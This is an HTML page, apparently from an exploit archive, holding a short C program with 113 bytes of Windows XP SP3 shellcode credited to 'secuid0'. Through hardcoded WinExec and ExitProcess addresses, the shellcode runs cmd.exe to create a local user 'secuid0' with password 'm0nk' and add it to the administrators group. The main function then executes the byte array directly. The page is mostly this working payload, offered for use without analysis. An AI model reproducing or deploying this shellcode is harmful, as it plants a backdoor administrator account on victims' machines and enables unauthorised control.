<html><head><title>Windows - pro sp3 (EN) - add new local administrator 113 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title: win32/xp pro sp3 (EN) 32-bit - add new local administrator 113 bytes
Author: Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
Method: Hardcoded opcodes (kernel32.winexec@7c8623ad, kernel32.exitprocess@7c81cafa)
Tested on: WinXP Pro SP3 (EN) 32bit - Build 2600.080413-2111
Greetz: offsec and inj3ct0r teams
*/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
char code[] =   &quot;\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23&quot;
                &quot;\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca&quot;
                &quot;\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63&quot;
                &quot;\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20&quot;
                &quot;\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x73&quot;
                &quot;\x65\x63\x75\x69\x64\x30\x20\x6d\x30\x6e&quot;
                &quot;\x6b\x20\x2f\x61\x64\x64\x20\x26\x26\x20&quot;
                &quot;\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67&quot;
                &quot;\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e&quot;
                &quot;\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20&quot;
                &quot;\x73\x65\x63\x75\x69\x64\x30\x20\x2f\x61&quot;
                &quot;\x64\x64\x00&quot;;
 
int main(int argc, char **argv)
{
    ((void (*)())code)();
    printf(&quot;New local admin \tUsername: secuid0\n\t\t\tPassword: m0nk&quot;);
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
